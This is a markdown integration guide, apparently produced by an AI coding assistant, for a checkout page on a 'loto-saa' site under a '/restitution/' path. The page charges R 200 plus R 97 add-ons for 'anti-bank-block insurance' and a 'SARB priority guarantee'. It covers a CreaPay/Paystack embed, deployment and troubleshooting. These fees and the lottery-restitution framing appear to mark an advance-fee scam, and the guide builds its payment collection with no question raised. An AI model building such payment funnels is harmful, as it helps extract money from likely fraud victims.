# Paystack (CreaPay Inline) Integration

## Overview
This repository now includes a **Paystack‑via‑CreaPay** checkout page located at:
```
/restitution/paystack_checkout.html
``` 
It replicates the design you provided and supports:
- Main product **R 200,00**
- Optional **Upsell** (+R 97,00 – Seguro Anti‑Bloqueio Bancário)
- Optional **Downsell** (+R 97,00 – Garantia de Prioridade SARB)
- Inline Paystack modal powered by `CreaPay.pay()`

## Prerequisites
1. **CreaPay API Key** – Set `CREAPAY_API_KEY` in Vercel (Settings → Environment Variables). The key must have permission to create orders (Paystack provider).
2. **Webhook Endpoint** – Ensure `https://loto-saa.vercel.app/api/record-sale.php` is reachable and the secret `CREAPAY_WEBHOOK_SECRET` is configured. This endpoint will receive `payment.approved` events.
3. **Domain** – The page must be served over HTTPS (Vercel provides this automatically).

## Server‑side endpoint (`api/create-order-200.php`)
The existing endpoint creates a CreaPay order with a **fixed amount of 20000 cents (R 200,00)**. It returns a JSON payload that contains at least:
```json
{
  "checkout_token": "SESSION_TOKEN",
  "order_id": "LOTO-200-<timestamp>",
  ...
}
```
### Required fields for Paystack
CreaPay automatically selects Paystack for ZAR transactions. No extra payload fields are needed, but you may optionally send:
- `save_card: true` – only after explicit consent.
- `tracking` – any UTM parameters you wish to keep for analytics.

If you need to customize the provider, add:
```json
"provider": "paystack"
```
to the payload. The current endpoint works without it because ZAR defaults to Paystack.

## Front‑end (`paystack_checkout.html`)
Key parts of the HTML/JS:
```html
<script src="https://pay.africagrabpoint.com/embed.js"></script>
```
Creates the global `CreaPay` object.
```js
const CREATE_ORDER_ENDPOINT = '/api/create-order-200.php';
...
const token = data.checkout_token;
await CreaPay.pay({
  checkoutToken: token,
  orderId: data.order_id,
  onStatus: state => {
    document.getElementById('status').textContent = 'Status: ' + state.status;
  }
});
```
- The button is disabled while the request is in flight and re‑enabled afterwards.
- Errors are displayed in the `#status` paragraph.

## Styling
The page uses the same fonts as the reference design:
```html
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Urbanist:wght@500;600;700;800;900&display=swap" rel="stylesheet" />
```
Colors, spacing, and logo are defined in the `<style>` block to match the mockup.

## Deployment steps
1. **Commit & push** – All changes are already committed (`86de70d`). Run:
   ```bash
   git add restitution/paystack_checkout.html PAYSTACK_INTEGRATION.md
   git commit -m "Add Paystack checkout page and documentation"
   git push origin main
   ```
2. Vercel will automatically build and deploy.
3. Verify the page:
   - Open `https://loto-saa.vercel.app/restitution/paystack_checkout.html`
   - Click *Pagar R 200,00* – the Paystack modal should appear.
   - Complete a test payment (use Paystack test keys – they are selected automatically by CreaPay).
4. Check the webhook logs in Vercel or in the CreaPay dashboard to ensure `payment.approved` events are received.

## Troubleshooting
| Symptom | Likely cause | Fix |
|--------|--------------|-----|
| **No modal appears** | `CREAPAY_API_KEY` missing or invalid | Verify the env var in Vercel and that it has `orders:create` permission. |
| **403 / 401 from `/api/create-order-200.php`** | API key not sent or malformed request | Ensure the request payload contains valid JSON and the `Authorization` header is automatically added by the server (via env var). |
| **`payment.approved` not reaching webhook** | Webhook URL not configured or secret mismatch | In CreaPay → Integrations, set the webhook URL to `https://loto-saa.vercel.app/api/record-sale.php` and copy the secret to `CREAPAY_WEBHOOK_SECRET` env var. |
| **Amount mismatch** | Front‑end overrides amount or extra values not added correctly | Check the calculation of `extra` in the script. It adds 9700 cents for each checked option. |
| **CORS error** | Vercel domain not whitelisted in CreaPay | Add `https://loto-saa.vercel.app` to the allowed origins list in CreaPay settings. |

---
**That’s it!** Your checkout now uses Paystack via CreaPay, matches the design you supplied, and includes full documentation for future developers.
